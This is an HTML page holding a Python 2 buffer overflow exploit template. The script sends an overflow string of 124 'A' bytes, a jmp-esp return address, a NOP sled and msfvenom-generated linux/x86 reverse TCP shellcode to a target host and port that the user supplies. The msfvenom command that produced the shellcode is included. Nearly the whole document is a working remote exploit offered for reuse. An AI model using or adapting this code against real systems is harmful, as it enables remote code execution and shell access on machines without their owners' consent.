<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Python Socket Overflow Template</title>
</head><body>#!/usr/bin/env python<br/>
import sys<br/>
import socket<br/>
<br/>
#Setup two arguments, target and target port<br/>
if len(sys.argv) &lt; 3:<br/>
  print &quot;Usage &quot;, sys.argv[0], &quot; &lt;target_ip&gt; &lt;target_port&gt;&quot;<br/>
  sys.exit(0)<br/>
<br/>
#Variable to hold 'junk'. Typically used to make initial overwrite<br/>
junk = 124*&quot;\x41&quot; #Overflow<br/>
junk += &quot;\x47\xb4\x12\x40&quot; #0x4012b447:	jmp  *%esp<br/>
<br/>
#msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b &quot;\x00\x0a\x0d&quot; --smallest -f python<br/>
#Payload size: 84 bytes<br/>
#Final size of python file: 416 bytes<br/>
buf = &quot;&quot;<br/>
buf += &quot;\x6a\x43\x59\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c\x0e&quot;<br/>
buf += &quot;\x07\xe2\xfa\x30\xd9\xf4\xe7\x56\x45\x54\x62\x0b\x83&quot;<br/>
buf += &quot;\xea\xbc\x6b\xc3\x8f\x83\x48\xa2\x2c\xd9\x95\x5f\x6e&quot;<br/>
buf += &quot;\xe1\x71\x65\x1b\x1c\x1c\x76\x1d\x20\x24\x1b\xaa\xc5&quot;<br/>
buf += &quot;\x95\x40\x77\x79\x7a\x99\x28\xa5\xcc\xe3\xaf\x62\x59&quot;<br/>
buf += &quot;\x5c\x1c\x47\x5d\x5e\x18\x17\x5b\x53\xb2\xdf\x6f\x6d&quot;<br/>
buf += &quot;\xb6\xa1\xf1\x49\x8e\xc4&quot;<br/>
<br/>
junk += 200*&quot;\x90&quot; #200 NOPsled<br/>
junk += buf #add payload<br/>
junk += &quot;\x43&quot; * (2000 - len(junk)) #to identify if we overshot<br/>
<br/>
#Setup socket connection, received first 1024, and print<br/>
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
s.connect((sys.argv[1],int(sys.argv[2])))<br/>
received = s.recv(1024)<br/>
print received<br/>
<br/>
#First send and receive to analyze<br/>
s.send(junk)<br/>
received = s.recv(1024)<br/>
print received<br/>
<br/>
#End close<br/>
s.close()<br/>
</body></html>